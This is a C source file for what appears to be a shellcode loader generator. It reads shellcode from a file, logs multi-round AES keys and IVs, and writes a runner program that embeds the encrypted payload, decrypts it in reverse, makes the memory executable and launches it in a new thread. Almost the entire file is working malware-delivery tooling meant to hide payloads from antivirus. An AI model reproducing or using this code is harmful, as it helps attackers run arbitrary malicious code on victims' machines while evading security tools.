#include <stdio.h>
#include <Windows.h>
#include "util.h"

// Does what it says. Reads shellcode from a specified file.
BOOL ReadShellcode(IN char* sFileName, OUT PVOID *pPayload, OUT SIZE_T *sPayloadSize)
{
	// Get file size
	FILE* fptr = NULL;
	fopen_s(&fptr, sFileName, "r");
	fseek(fptr, 0, SEEK_END);
	SIZE_T sFileSize = ftell(fptr);
	fclose(fptr);

	// Read file
	fptr = NULL;
	fopen_s(&fptr, sFileName, "r");
	char* pReadIn = malloc(sFileSize);
	fgets(pReadIn, sFileSize, fptr);
	fclose(fptr);

	// Return vals
	*pPayload = pReadIn;
	*sPayloadSize = sFileSize;

	return EXIT_SUCCESS;
}

// Logs keys and IVs for each encryption round
BOOL LogAES(IN BYTE* pKey, IN BYTE* pIV, IN int nRound)
{
	// Keychain file pointer
	FILE* fKeychain = fopen("keychain.txt", "a");

	// Print pkey in C formatting
	fprintf(fKeychain, "\nBYTE pKey%i[] = { ", nRound);
	for (int j = 0; j < 32; j++) {
		if (j == 31)
		{
			fprintf(fKeychain, "0x%0.2X };", pKey[j]);
		}
		else {
			fprintf(fKeychain, "0x%0.2X, ", pKey[j]);
		}
	}
	// print pIV in C formatting
	fprintf(fKeychain, "\nBYTE pIV%ld[] = { ", nRound);
	for (int j = 0; j < 16; j++) {
		if (j == 15)
		{
			fprintf(fKeychain, "0x%0.2X };", pIV[j]);
		}
		else {
			fprintf(fKeychain, "0x%0.2X, ", pIV[j]);
		}
	}

	fclose(fKeychain);

}


// Writes the runner. Takes in payload and options flags.
BOOL WriteRunner(IN PVOID pPayload, IN SIZE_T sPayloadSize, IN struct UserOptions sMenuOptions)
{
	// Runner file pointer
	FILE* fRunner = fopen("runner.c", "w");
	// Keychain file pointer
	FILE* fKeychain = fopen("keychain.txt", "r");

	// Write file header, conditional payload placement
	WriteHeader(pPayload, sPayloadSize, fRunner, sMenuOptions);
	
	// Get number of encryption rounds
	SIZE_T sLineSize = 300;
	char* cLine = malloc(sLineSize);
	fgets(cLine, sLineSize, fKeychain); // skip newline at start

	// We need to read in backwards.
	for (int i = 0; i < sMenuOptions.nRounds; i++)
	{
		fgets(cLine, sLineSize, fKeychain); // Get key from keychain
		fprintf(fRunner, cLine); // Print key to runner
		fgets(cLine, sLineSize, fKeychain); // Get IV from keychain
		fprintf(fRunner, cLine); // Print IV to runner
		fprintf(fRunner, "\nstruct AES_ctx ctx%i;\n", i);
		fprintf(fRunner, "AES_init_ctx_iv(&ctx%i, pKey%i, pIV%i);\n\n",i, i, i); // Init key ctx struct. Absolutely disgusting way to do this but it works 
	}
	for (int i = sMenuOptions.nRounds-1; i > -1; i--)
	{
		fprintf(fRunner, "AES_CBC_decrypt_buffer(&ctx%i, pPayload, sPayloadSize);\n", i); // Decrypt backwards
	}

	// EXECUTION
	WriteExecution(fRunner, sMenuOptions);

	fprintf(fRunner, "return EXIT_SUCCESS;\n}");
	fclose(fRunner);

	return EXIT_SUCCESS;
}

// Write header and payload for runner
BOOL WriteHeader(IN PBYTE pPayload, IN SIZE_T sPayloadSize, IN FILE* fRunner, IN struct UserOptions sMenuOptions)
{
	switch (sMenuOptions.cPlacement)
	{
		// .text
		case 1:
			// Header
			fprintf(fRunner,"#include <Windows.h>\n"
							"#include \"aes.h\"\n"
							"int main(int argc, char* argv[]){\n"
							"struct AES_ctx ctx;\n"
							"BYTE pPayload[] = {");
			// Write payload and size
			for (int j = 0; j < sPayloadSize; j++) {
				if (j == (sPayloadSize-1))
				{
					fprintf(fRunner, "0x%0.2X };\n", pPayload[j]);
				}
				else {
					fprintf(fRunner, "0x%0.2X, ", pPayload[j]);
				}
			}
			fprintf(fRunner, "SIZE_T sPayloadSize = %ld;\n\n", sPayloadSize);

			break;

		// .data
		case 2:
			fprintf(fRunner,"#include <Windows.h>\n"
							"#include \"aes.h\"\n"
							"const BYTE pProtected[] = { ");
			// Write payload and size (const)
			for (int j = 0; j < sPayloadSize; j++) {
				if (j == (sPayloadSize - 1))
				{
					fprintf(fRunner, "0x%0.2X };\n", pPayload[j]);
				}
				else {
					fprintf(fRunner, "0x%0.2X, ", pPayload[j]);
				}
			}
			fprintf(fRunner, "SIZE_T sPayloadSize = %ld;\n\n", sPayloadSize);

			// Finish header
			fprintf(fRunner,"int main(int argc, char* argv[]){\n"
							"\nPVOID pPayload = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
							"RtlMoveMemory(pPayload, pProtected, sPayloadSize);\n\n");
			break;
	}

	return EXIT_SUCCESS;
}

// Write execution process for runner
BOOL WriteExecution(IN FILE* fRunner, IN struct UserOptions sMenuOptions)
{
	switch (sMenuOptions.cExecute)
	{
		// Local thread execution
		case 1:
		fprintf(fRunner,"\nPVOID pWorkBuffer = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
						"RtlMoveMemory(pWorkBuffer, pPayload, sPayloadSize);\n\n"
						"DWORD proc = 0;\n"
						"BOOL bExecute = VirtualProtect(pWorkBuffer, sPayloadSize, PAGE_EXECUTE_READ, &proc);\n"
						"HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pWorkBuffer, 0, 0, 0);\n"
						"WaitForSingleObject(hThread, -1);\n\n");
			break;
	}
}